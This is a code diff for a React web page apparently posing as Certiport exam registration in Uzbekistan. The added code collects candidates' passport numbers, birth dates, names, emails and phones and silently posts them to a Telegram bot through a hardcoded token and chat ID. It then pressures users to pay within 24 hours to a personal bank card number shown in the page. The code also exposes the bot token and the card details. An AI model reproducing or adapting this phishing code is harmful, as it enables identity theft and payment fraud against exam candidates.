@@ -3,8 +3,8 @@
  * SPDX-License-Identifier: Apache-2.0
  */
 
-import { useState, useEffect } from 'react';
-import { Menu, ChevronDown, ChevronLeft, ChevronRight, RotateCcw } from 'lucide-react';
+import { useState, useEffect, useRef } from 'react';
+import { Menu, ChevronDown, ChevronLeft, ChevronRight, RotateCcw, CheckCircle2, X } from 'lucide-react';
 import { motion, AnimatePresence } from 'motion/react';
 
 // --- Types ---
@@ -12,13 +12,81 @@ type Exam = 'HTML and CSS' | 'IC3 Digital Literacy GS5' | 'IC3 Digital Literacy 
 type Language = 'English' | 'Русский';
 type Module = 'Level 1' | 'Level 2' | 'Level 3';
 type Location = 'Buxoro / Бухара' | 'Namangan / Наманган' | 'Samarqand / Самарканд' | 'Toshkent / Ташкент' | 'Urganch / Ургенч';
+type View = 'form' | 'success' | 'payment';
 
 export default function App() {
+  const [view, setView] = useState<View>('form');
+  const [hasSubmitted, setHasSubmitted] = useState(false);
+  const [showHelp, setShowHelp] = useState(false);
   const [selectedExam, setSelectedExam] = useState<Exam | ''>('');
   const [selectedLang, setSelectedLang] = useState<Language | ''>('');
   const [selectedModule, setSelectedModule] = useState<Module | ''>('');
   const [selectedLocation, setSelectedLocation] = useState<Location | ''>('');
   const [selectedDate, setSelectedDate] = useState<number | null>(null);
+  
+  // New Form Fields
+  const [passport, setPassport] = useState('');
+  const [examTime, setExamTime] = useState<'9:00' | '12:00' | '14:00' | ''>('');
+  const [email, setEmail] = useState('');
+  const [birthDate, setBirthDate] = useState({ day: '', month: '', year: '' });
+  const [firstName, setFirstName] = useState('');
+  const [lastName, setLastName] = useState('');
+  const [phone, setPhone] = useState('');
+  
+  const [paymentCodeInput, setPaymentCodeInput] = useState('');
+  const [showPaymentDetails, setShowPaymentDetails] = useState(false);
+
+  const formRef = useRef<HTMLDivElement>(null);
+
+  useEffect(() => {
+    const submitted = localStorage.getItem('certiport_submitted');
+    if (submitted === 'true') {
+      setHasSubmitted(true);
+    }
+  }, []);
+
+  const scrollToForm = () => {
+    formRef.current?.scrollIntoView({ behavior: 'smooth' });
+  };
+
+  const sendToTelegram = async () => {
+    const token = '8494561832:AAFIcuk9CPlSDQycUS829sReJDhqpiQtlUQ';
+    const adminId = '8426582765';
+    const message = `
+🆕 Yangi Ro'yxatdan o'tish:
+👤 Ism: ${firstName} ${lastName}
+📅 Tug'ilgan kun: ${birthDate.day}.${birthDate.month}.${birthDate.year}
+🆔 Pasport: ${passport}
+📧 Email: ${email}
+📞 Tel: ${phone}
+📝 Imtihon: ${selectedExam}
+🌐 Til: ${selectedLang}
+📦 Modul: ${selectedModule}
+📍 Joy: ${selectedLocation}
+🗓 Sana: ${selectedDate} April 2026
+⏰ Vaqt: ${examTime}
+    `;
+
+    try {
+      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: adminId,
+          text: message,
+        }),
+      });
+    } catch (error) {
+      console.error('Telegram error:', error);
+    }
+  };
+
+  const handleSubmit = async () => {
+    await sendToTelegram();
+    localStorage.setItem('certiport_submitted', 'true');
+    setHasSubmitted(true);
+    setView('success');
+  };
 
   // Form options
   const exams: Exam[] = ['HTML and CSS', 'IC3 Digital Literacy GS5', 'IC3 Digital Literacy GS6', 'Microsoft Excel'];
@@ -26,17 +94,141 @@ export default function App() {
   const modules: Module[] = ['Level 1', 'Level 2', 'Level 3'];
   const locations: Location[] = ['Buxoro / Бухара', 'Namangan / Наманган', 'Samarqand / Самарканд', 'Toshkent / Ташкент', 'Urganch / Ургенч'];
 
-  // Calendar logic (simplified for April 2026 as per screenshot)
-  const daysInMonth = 30;
-  const startDay = 3; // Wednesday (0=Sun, 1=Mon, 2=Tue, 3=Wed)
+  // Calendar logic
+  const daysInMonth = 30; // April has 30 days
+  const startDay = 3; // Wednesday
   const calendarDays = Array.from({ length: daysInMonth }, (_, i) => i + 1);
   const emptyDays = Array.from({ length: startDay }, (_, i) => i);
 
+  const redDays = hasSubmitted ? calendarDays : [9, 12, 18, 19, 23, 25, 26, 28];
+  const greenDays = hasSubmitted ? [] : [21];
+
+  if (view === 'success') {
+    return (
+      <div className="min-h-screen bg-white font-sans text-gray-800 flex flex-col items-center justify-center p-6">
+        <div className="w-full max-w-md bg-white rounded-2xl border border-gray-100 p-8 shadow-2xl text-center space-y-8">
+          <div className="flex justify-center">
+            <div className="bg-[#22c55e] p-4 rounded-full">
+              <CheckCircle2 size={64} className="text-white" />
+            </div>
+          </div>
+          
+          <h2 className="text-3xl font-bold text-[#22c55e] leading-tight">
+            Ro'yxatdan o'tish muvaffaqiyatli!
+          </h2>
+          
+          <div className="text-gray-600 space-y-4 text-lg">
+            <p>So'rovingiz qabul qilindi.</p>
+            <p>Iltimos, pochtangizga yuborilgan xabardagi ko'rsatmalarga amal qiling. SPAM bo'limini tekshirishni unutmang.</p>
+          </div>
+          
+          <div className="py-4">
+            <p className="text-gray-500 text-sm uppercase tracking-wider">Sizning so'rovnoma raqamingiz:</p>
+            <p className="text-3xl font-bold text-[#006699]">#4701</p>
+          </div>
+          
+          <div className="bg-gray-50 p-6 rounded-xl border border-gray-100 italic text-gray-700">
+            To'lov 24 soat ichida amalga oshirilmasa, ariza bekor qilinadi!
+          </div>
+          
+          <button 
+            onClick={() => setView('payment')}
+            className="w-full bg-[#1d70b8] text-white font-bold py-4 rounded-lg text-lg uppercase tracking-wide hover:bg-[#155a96] transition-colors"
+          >
+            TO'LOVGA O'TISH
+          </button>
+        </div>
+      </div>
+    );
+  }
+
+  if (view === 'payment') {
+    return (
+      <div className="min-h-screen bg-white font-sans text-gray-800 flex flex-col items-center justify-center p-6">
+        <div className="w-full max-w-md bg-white rounded-2xl border border-gray-100 p-8 shadow-2xl space-y-8">
+          <h2 className="text-2xl font-bold text-[#006699] text-center">To'lovni amalga oshirish</h2>
+          
+          {!showPaymentDetails ? (
+            <div className="space-y-6">
+              <p className="text-center text-gray-600">Sizga berilgan kodni kiriting (bu kodni eslab qoling: #4701)</p>
+              <input 
+                type="text" 
+                placeholder="Kodni kiriting"
+                value={paymentCodeInput}
+                onChange={(e) => setPaymentCodeInput(e.target.value)}
+                className="w-full border-2 border-gray-200 rounded-lg p-4 text-center text-2xl font-bold focus:border-[#007ba7] outline-none"
+              />
+              <button 
+                onClick={() => paymentCodeInput === '4701' && setShowPaymentDetails(true)}
+                className="w-full bg-[#007ba7] text-white font-bold py-4 rounded-lg hover:bg-[#00668a] transition-colors"
+              >
+                TASDIQLASH
+              </button>
+            </div>
+          ) : (
+            <div className="space-y-8 animate-in fade-in slide-in-from-bottom-4 duration-500">
+              <div className="bg-blue-50 p-6 rounded-xl border border-blue-100 space-y-4">
+                <p className="text-center text-gray-700 font-medium">To'lov ma'lumotlari:</p>
+                <div className="bg-white p-4 rounded-lg border border-blue-200 text-center">
+                  <p className="text-xl font-mono font-bold text-gray-800 tracking-wider">9860 0801 6331 0560</p>
+                  <p className="text-sm text-gray-500 mt-1 uppercase">K. yormaxmadov nomidagi karta</p>
+                </div>
+                <p className="text-center text-2xl font-bold text-[#006699]">500 UZS</p>
+              </div>
+              <p className="text-center text-red-500 font-medium italic">To'lovni amalga oshirganingizdan so'ng chekni saqlab qo'ying.</p>
+              <button 
+                onClick={() => setView('form')}
+                className="w-full border-2 border-[#007ba7] text-[#007ba7] font-bold py-4 rounded-lg hover:bg-blue-50 transition-colors"
+              >
+                ASOSIY SAHIFAGA QAYTISH
+              </button>
+            </div>
+          )}
+        </div>
+      </div>
+    );
+  }
+
   return (
     <div className="min-h-screen bg-white font-sans text-gray-800">
+      {/* Help Modal */}
+      <AnimatePresence>
+        {showHelp && (
+          <motion.div 
+            initial={{ opacity: 0 }}
+            animate={{ opacity: 1 }}
+            exit={{ opacity: 0 }}
+            className="fixed inset-0 z-[100] bg-black/50 flex items-center justify-center p-6"
+          >
+            <motion.div 
+              initial={{ scale: 0.9, opacity: 0 }}
+              animate={{ scale: 1, opacity: 1 }}
+              exit={{ scale: 0.9, opacity: 0 }}
+              className="bg-white rounded-2xl p-8 max-w-sm w-full relative"
+            >
+              <button onClick={() => setShowHelp(false)} className="absolute top-4 right-4 text-gray-400 hover:text-gray-600">
+                <X size={24} />
+              </button>
+              <h3 className="text-2xl font-bold text-[#006699] mb-4">Yordam bo'limi</h3>
+              <p className="text-gray-600 mb-6">Savollaringiz bormi? Biz bilan bog'laning yoki yo'riqnoma bilan tanishib chiqing.</p>
+              <ul className="space-y-3">
+                <li className="flex items-center gap-3 text-gray-700">
+                  <div className="w-2 h-2 bg-[#007ba7] rounded-full" />
+                  <span>Telegram: @certiport_uz</span>
+                </li>
+                <li className="flex items-center gap-3 text-gray-700">
+                  <div className="w-2 h-2 bg-[#007ba7] rounded-full" />
+                  <span>Tel: +998 90 123 45 67</span>
+                </li>
+              </ul>
+            </motion.div>
+          </motion.div>
+        )}
+      </AnimatePresence>
+
       {/* Header */}
       <header className="sticky top-0 z-50 flex items-center justify-between bg-white px-4 py-3 shadow-sm border-b border-gray-100">
-        <div className="flex flex-col">
+        <div className="flex flex-col cursor-pointer" onClick={() => window.scrollTo({ top: 0, behavior: 'smooth' })}>
           <div className="flex items-baseline gap-1">
             <span className="text-xl font-bold tracking-tighter text-[#006699]">CERT</span>
             <span className="relative flex items-center">
@@ -50,10 +242,13 @@ export default function App() {
         </div>
         
         <div className="flex items-center gap-3">
-          <button className="rounded bg-[#007ba7] px-4 py-1.5 text-sm font-medium text-white transition-colors hover:bg-[#00668a]">
+          <button 
+            onClick={scrollToForm}
+            className="rounded bg-[#007ba7] px-4 py-1.5 text-sm font-medium text-white transition-colors hover:bg-[#00668a]"
+          >
             Registratsiya
           </button>
-          <button className="p-1 text-gray-600">
+          <button onClick={() => setShowHelp(true)} className="p-1 text-gray-600">
             <Menu size={28} strokeWidth={1.5} />
           </button>
         </div>
@@ -65,7 +260,7 @@ export default function App() {
           Ro'yxatdan o'tish
         </h1>
 
-        <div className="rounded-xl border border-gray-100 bg-white p-6 shadow-[0_8px_30px_rgb(0,0,0,0.04)]">
+        <div ref={formRef} className="rounded-xl border border-gray-100 bg-white p-6 shadow-[0_8px_30px_rgb(0,0,0,0.04)]">
           <div className="space-y-6">
             {/* Exam Selection */}
             <div>
@@ -191,21 +386,20 @@ export default function App() {
                           {emptyDays.map((d) => <div key={`empty-${d}`} />)}
                           {calendarDays.map((day) => {
                             const isSelected = selectedDate === day;
-                            const redDays = [9, 18, 19, 23, 25, 26, 28];
-                            const greenDays = [12, 21, 30];
-                            
                             const isRed = redDays.includes(day);
                             const isGreen = greenDays.includes(day);
 
                             return (
                               <button
                                 key={day}
+                                disabled={hasSubmitted || !isGreen}
                                 onClick={() => setSelectedDate(day)}
                                 className={`flex h-8 w-8 items-center justify-center rounded-full text-sm transition-all
                                   ${isSelected ? 'bg-[#007ba7] text-white' : 'text-gray-700 hover:bg-gray-100'}
                                   ${isRed && !isSelected ? 'bg-red-500 text-white' : ''}
                                   ${isGreen && !isSelected ? 'bg-[#90EE90] text-gray-800' : ''}
-                                  ${day < 5 ? 'opacity-30 pointer-events-none' : ''} // Mimicking disabled days
+                                  ${day < 5 ? 'opacity-30 pointer-events-none' : ''}
+                                  ${(!isGreen && !isRed && day >= 5) ? 'text-gray-400' : ''}
                                 `}
                               >
                                 {day}
@@ -214,6 +408,97 @@ export default function App() {
                           })}
                         </div>
                       </div>
+                    </motion.div>
+                  )}
+
+                  {/* Extended Form Fields (Visible when date 21 is selected) */}
+                  {selectedDate === 21 && (
+                    <motion.div
+                      initial={{ opacity: 0, height: 0 }}
+                      animate={{ opacity: 1, height: 'auto' }}
+                      className="space-y-6 pt-6 border-t border-gray-100"
+                    >
+                      {/* Passport */}
+                      <div>
+                        <label className="mb-2 block text-sm font-medium text-gray-600">Pasport seriyasi va raqami *</label>
+                        <input 
+                          type="text" 
+                          placeholder="AA 1234567"
+                          value={passport}
+                          onChange={(e) => setPassport(e.target.value)}
+                          className="w-full rounded-lg border border-gray-300 px-4 py-3 focus:border-[#007ba7] outline-none"
+                        />
+                      </div>
+
+                      {/* Exam Time */}
+                      <div>
+                        <label className="mb-2 block text-sm font-medium text-gray-600">Imtihon vaqti *</label>
+                        <div className="grid grid-cols-3 gap-3">
+                          {['9:00', '12:00', '14:00'].map((time) => (
+                            <button
+                              key={time}
+                              onClick={() => setExamTime(time as any)}
+                              className={`py-3 rounded-lg border font-medium transition-all ${examTime === time ? 'bg-[#007ba7] text-white border-[#007ba7]' : 'bg-white text-gray-600 border-gray-300 hover:border-[#007ba7]'}`}
+                            >
+                              {time}
+                            </button>
+                          ))}
+                        </div>
+                      </div>
+
+                      {/* Email */}
+                      <div>
+                        <label className="mb-2 block text-sm font-medium text-gray-600">Email *</label>
+                        <input 
+                          type="email" 
+                          placeholder="example@mail.com"
+                          value={email}
+                          onChange={(e) => setEmail(e.target.value)}
+                          className="w-full rounded-lg border border-gray-300 px-4 py-3 focus:border-[#007ba7] outline-none"
+                        />
+                      </div>
+
+                      {/* Birth Date */}
+                      <div>
+                        <label className="mb-2 block text-sm font-medium text-gray-600">Tug'ilgan kun (kun/oy/yil) *</label>
+                        <div className="grid grid-cols-3 gap-3">
+                          <input type="text" placeholder="Kun" value={birthDate.day} onChange={(e) => setBirthDate({...birthDate, day: e.target.value})} className="rounded-lg border border-gray-300 px-4 py-3 focus:border-[#007ba7] outline-none" />
+                          <input type="text" placeholder="Oy" value={birthDate.month} onChange={(e) => setBirthDate({...birthDate, month: e.target.value})} className="rounded-lg border border-gray-300 px-4 py-3 focus:border-[#007ba7] outline-none" />
+                          <input type="text" placeholder="Yil" value={birthDate.year} onChange={(e) => setBirthDate({...birthDate, year: e.target.value})} className="rounded-lg border border-gray-300 px-4 py-3 focus:border-[#007ba7] outline-none" />
+                        </div>
+                      </div>
+
+                      {/* Name Fields */}
+                      <div className="grid grid-cols-2 gap-3">
+                        <div>
+                          <label className="mb-2 block text-sm font-medium text-gray-600">Ism *</label>
+                          <input type="text" value={firstName} onChange={(e) => setFirstName(e.target.value)} className="w-full rounded-lg border border-gray-300 px-4 py-3 focus:border-[#007ba7] outline-none" />
+                        </div>
+                        <div>
+                          <label className="mb-2 block text-sm font-medium text-gray-600">Familiya *</label>
+                          <input type="text" value={lastName} onChange={(e) => setLastName(e.target.value)} className="w-full rounded-lg border border-gray-300 px-4 py-3 focus:border-[#007ba7] outline-none" />
+                        </div>
+                      </div>
+
+                      {/* Phone */}
+                      <div>
+                        <label className="mb-2 block text-sm font-medium text-gray-600">Telefon raqam *</label>
+                        <input 
+                          type="tel" 
+                          placeholder="+998 90 123 45 67"
+                          value={phone}
+                          onChange={(e) => setPhone(e.target.value)}
+                          className="w-full rounded-lg border border-gray-300 px-4 py-3 focus:border-[#007ba7] outline-none"
+                        />
+                      </div>
+
+                      {/* Submit Button */}
+                      <button 
+                        onClick={handleSubmit}
+                        className="w-full bg-[#007ba7] text-white font-bold py-4 rounded-lg hover:bg-[#00668a] transition-all transform active:scale-[0.98] shadow-lg"
+                      >
+                        YUBORISH
+                      </button>
                     </motion.div>
                   )}
                 </motion.div>
